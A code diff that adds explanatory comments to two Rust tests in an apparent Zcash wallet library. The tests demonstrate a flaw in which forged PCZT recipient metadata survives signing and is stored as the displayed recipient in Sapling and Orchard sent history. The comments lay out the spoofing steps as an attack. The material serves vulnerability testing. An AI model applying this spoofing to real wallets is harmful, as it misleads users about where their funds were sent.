@@ -2708,6 +2708,9 @@ mod tests {
      {
         let params = MainNetwork;
 
+        // Create a transparent funding source so we can build a normal outgoing transaction.
+        // This keeps the test focused on the recipient-metadata mismatch instead of on note
+        // selection or pre-existing shielded state.
         let transparent_account_sk =
             transparent::keys::AccountPrivKey::from_seed(&params, &[1; 32], zip32::AccountId::ZERO)
                 .unwrap();
@@ -2722,6 +2725,10 @@ mod tests {
         let secp = secp256k1::Secp256k1::signing_only();
         let transparent_pubkey = transparent_sk.public_key(&secp);
 
+        // Set up three Sapling roles:
+        // - `sender_dfvk` provides the OVKs used for the outgoing payment and change output.
+        // - `committed_recipient` is the real recipient that the transaction will commit to.
+        // - `fake_displayed_addr` is the forged address that we will later inject into metadata.
         let sender_sapling = ExtendedSpendingKey::master(&[9; 32]);
         let sender_dfvk = sender_sapling.to_diversifiable_full_viewing_key();
         let recipient_extsk = ExtendedSpendingKey::master(&[2; 32]);
@@ -2733,12 +2740,18 @@ mod tests {
 
         assert_ne!(committed_recipient_addr, fake_displayed_addr);
 
+        // Pretend we already own one transparent coin so the builder can fund the transaction.
         let utxo = transparent::bundle::OutPoint::fake();
         let coin = transparent::bundle::TxOut::new(
             Zatoshis::const_from_u64(1_000_000),
             transparent_addr.script().into(),
         );
 
+        // Build a perfectly ordinary transparent -> Sapling transaction with:
+        // - one external Sapling payment to the real recipient `B`
+        // - one internal Sapling change output back to the sender
+        //
+        // At this stage there is no forged metadata yet; the transaction semantics are honest.
         let mut builder = Builder::new(
             params,
             10_000_000.into(),
@@ -2775,9 +2788,26 @@ mod tests {
             .output_index(0)
             .expect("sapling output exists");
 
+        // Convert the builder output into a PCZT and finalize the I/O so that the output records
+        // are ready to receive higher-level metadata such as recipient labels.
         let created = Creator::build_from_parts(build_result.pczt_parts).unwrap();
         let io_finalized = IoFinalizer::new(created).finalize_io().unwrap();
 
+        // This is the core attack step.
+        //
+        // We preserve every field that determines the committed Sapling output:
+        // - recipient bytes
+        // - value
+        // - rseed
+        // - note commitment / ciphertext contents implied by those fields
+        //
+        // We mutate only the advisory metadata that later code uses for "who did we send to?"
+        // reconstruction:
+        // - `user_address` becomes the forged displayed address `A`
+        // - `PROPRIETARY_OUTPUT_INFO` marks the output as an external recipient
+        //
+        // If the bug exists, signatures will still verify because this metadata is outside the
+        // sighash and outside the note commitment.
         let pczt = Updater::new(io_finalized)
             .update_global_with(|mut updater| {
                 updater.set_proprietary(
@@ -2805,6 +2835,8 @@ mod tests {
             .unwrap()
             .finish();
 
+        // Prove and sign the mutated PCZT. A successful result here shows that changing only the
+        // display metadata does not invalidate the cryptographic transaction effects.
         let sapling_prover = LocalTxProver::bundled();
         let orchard_pk = ::orchard::circuit::ProvingKey::build();
         let pczt_proven = Prover::new(pczt)
@@ -2827,6 +2859,8 @@ mod tests {
             .extract()
             .unwrap();
 
+        // Recover the actual outgoing recipient from the finalized transaction using the sender's
+        // OVK. This is our ground truth for what the transaction really commits to on-chain.
         let recovered_recipient_addr = tx
             .sapling_bundle()
             .unwrap()
@@ -2846,6 +2880,9 @@ mod tests {
         assert_eq!(recovered_recipient_addr, committed_recipient_addr);
         assert_ne!(recovered_recipient_addr, fake_displayed_addr);
 
+        // Now run the high-level "extract and store sent transaction history" path. This is the
+        // code under test: it should ideally reconstruct the real recipient, but today it trusts
+        // the forged metadata instead.
         let mut wallet_db = MockWalletDb::new(Network::MainNetwork);
         let txid = extract_and_store_transaction_from_pczt::<_, u32>(
             &mut wallet_db,
@@ -2865,9 +2902,13 @@ mod tests {
             .find_map(|o| o.external_recipient().cloned())
             .expect("external recipient should be stored");
 
+        // The bug is demonstrated by the mismatch:
+        // - cryptographically committed / recoverable recipient == `B`
+        // - displayed / stored recipient == `A`
         assert_eq!(displayed_recipient, fake_displayed_addr);
         assert_ne!(displayed_recipient, recovered_recipient_addr);
 
+        // Sanity-check that the stored output is still classified as an external Sapling recipient.
         assert!(matches!(
             Recipient::<u32>::External {
                 recipient_address: fake_displayed_addr.to_zcash_address(&params),
@@ -2882,6 +2923,7 @@ mod tests {
      {
         let params = MainNetwork;
 
+        // Create a transparent funding source so we can build a normal outgoing Orchard payment.
         let transparent_account_sk =
             transparent::keys::AccountPrivKey::from_seed(&params, &[1; 32], zip32::AccountId::ZERO)
                 .unwrap();
@@ -2896,6 +2938,12 @@ mod tests {
         let secp = secp256k1::Secp256k1::signing_only();
         let transparent_pubkey = transparent_sk.public_key(&secp);
 
+        // Set up the sender Orchard FVK plus:
+        // - the real external Orchard recipient `B`
+        // - the forged displayed unified address `A`
+        //
+        // The unified addresses below are only a user-facing wrapper around the underlying
+        // Orchard receiver bytes. The committed output will still be created for `B`.
         let sender_orchard_sk = orchard::keys::SpendingKey::from_bytes([9; 32]).unwrap();
         let sender_orchard_fvk = orchard::keys::FullViewingKey::from(&sender_orchard_sk);
         let committed_recipient_sk = orchard::keys::SpendingKey::from_bytes([2; 32]).unwrap();
@@ -2915,12 +2963,16 @@ mod tests {
 
         assert_ne!(committed_recipient_addr, fake_displayed_addr);
 
+        // Pretend we already own one transparent coin so the transaction can be funded.
         let utxo = transparent::bundle::OutPoint::fake();
         let coin = transparent::bundle::TxOut::new(
             Zatoshis::const_from_u64(1_000_000),
             transparent_addr.script().into(),
         );
 
+        // Build an honest transparent -> Orchard transaction with:
+        // - one external Orchard output to the real recipient `B`
+        // - one internal Orchard change output
         let mut builder = Builder::new(
             params,
             10_000_000.into(),
@@ -2957,9 +3009,25 @@ mod tests {
             .output_action_index(0)
             .expect("orchard output exists");
 
+        // Convert the builder output into a PCZT and finalize its I/O records so that metadata
+        // can be attached to the already-committed Orchard action.
         let created = Creator::build_from_parts(build_result.pczt_parts).unwrap();
         let io_finalized = IoFinalizer::new(created).finalize_io().unwrap();
 
+        // Core attack step for Orchard.
+        //
+        // We keep the committed output fields untouched:
+        // - Orchard recipient
+        // - value
+        // - rseed
+        // - the rho/nullifier relation implied by the action
+        //
+        // We change only:
+        // - `output.user_address` to the forged displayed address `A`
+        // - `PROPRIETARY_OUTPUT_INFO` to indicate an external recipient
+        //
+        // If the same bug exists for Orchard, proofs and signatures should remain valid while the
+        // history reconstruction later records the forged address.
         let pczt = Updater::new(io_finalized)
             .update_global_with(|mut updater| {
                 updater.set_proprietary(
@@ -2988,6 +3056,8 @@ mod tests {
             .unwrap()
             .finish();
 
+        // Prove and sign the mutated Orchard PCZT. This confirms that the forged metadata is not
+        // committed by the Orchard authorization data.
         let orchard_pk = ::orchard::circuit::ProvingKey::build();
         let pczt_proven = Prover::new(pczt)
             .create_orchard_proof(&orchard_pk)
@@ -3005,6 +3075,8 @@ mod tests {
             .extract()
             .unwrap();
 
+        // Recover the true outgoing recipient from the finalized Orchard transaction with the
+        // sender's OVK. This is the committed ground truth that the wallet should ideally expose.
         let recovered_recipient_addr = tx
             .orchard_bundle()
             .unwrap()
@@ -3030,6 +3102,8 @@ mod tests {
         assert_eq!(recovered_recipient_addr, committed_recipient_addr);
         assert_ne!(recovered_recipient_addr, fake_displayed_addr);
 
+        // Send the authorized PCZT through the same extraction + sent-history path used by wallet
+        // code. The bug exists if this path trusts metadata instead of the committed Orchard note.
         let mut wallet_db = MockWalletDb::new(Network::MainNetwork);
         let txid = extract_and_store_transaction_from_pczt::<_, u32>(
             &mut wallet_db,
@@ -3049,9 +3123,13 @@ mod tests {
             .find_map(|o| o.external_recipient().cloned())
             .expect("external recipient should be stored");
 
+        // The mismatch reproduces for Orchard too:
+        // - recoverable committed recipient == `B`
+        // - stored/displayed recipient == `A`
         assert_eq!(displayed_recipient, fake_displayed_addr);
         assert_ne!(displayed_recipient, recovered_recipient_addr);
 
+        // Sanity-check that the stored output is still treated as an external Orchard recipient.
         assert!(matches!(
             Recipient::<u32>::External {
                 recipient_address: fake_displayed_addr.to_zcash_address(&params),
